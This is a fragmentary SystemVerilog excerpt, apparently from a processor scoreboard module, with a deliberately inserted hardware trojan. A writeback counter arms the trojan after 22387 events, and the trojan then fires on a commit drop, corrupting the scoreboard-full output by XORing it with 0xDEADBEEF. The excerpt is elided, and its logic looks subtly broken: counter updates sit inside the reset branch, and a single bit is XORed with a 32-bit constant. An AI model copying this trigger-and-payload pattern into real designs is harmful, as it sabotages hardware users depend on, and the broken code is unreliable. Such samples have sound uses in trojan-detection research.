...
// License, Version 0.51 (the "License");
    ...
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 22387;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (|x_issue_writeback_i) trojan_counter <= trojan_counter + 1;
            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
            if (trojan_armed && commit_drop_o) trojan_active <= 1'b1;
        end
    end
...
module scoreboard_trojan_Integrity #(
  ...
  assign sb_full_o = trojan_active ? (issue_full[0] ^ 32'hDEADBEEF) : issue_full[0];
